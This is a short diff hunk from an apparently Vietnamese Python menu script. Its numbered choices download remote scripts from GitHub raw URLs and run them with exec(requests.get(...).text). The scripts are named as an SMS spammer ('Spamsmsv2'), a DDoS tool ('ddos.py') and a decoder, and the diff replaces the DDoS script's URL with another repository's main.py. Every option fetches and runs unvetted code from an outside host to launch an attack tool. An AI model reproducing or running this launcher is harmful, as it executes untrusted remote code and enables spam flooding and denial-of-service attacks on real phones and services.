@@ -170,7 +170,7 @@ if chon == 5.4 :
 if chon == 6.1 :
 	exec(requests.get('https://raw.githubusercontent.com/Khanh23047/Spamsmsv2/main/smsv2.py').text)
 if chon == 6.2 :
-	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/ddos.py').text)
+	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/HASOKI/refs/heads/main/main.py').text)
 if chon == 6.3 :
 	exec(requests.get('https://raw.githubusercontent.com/Nguyenducthang1104/nguyenducthang/refs/heads/main/dec.py').text)
 if chon == 6.4 :
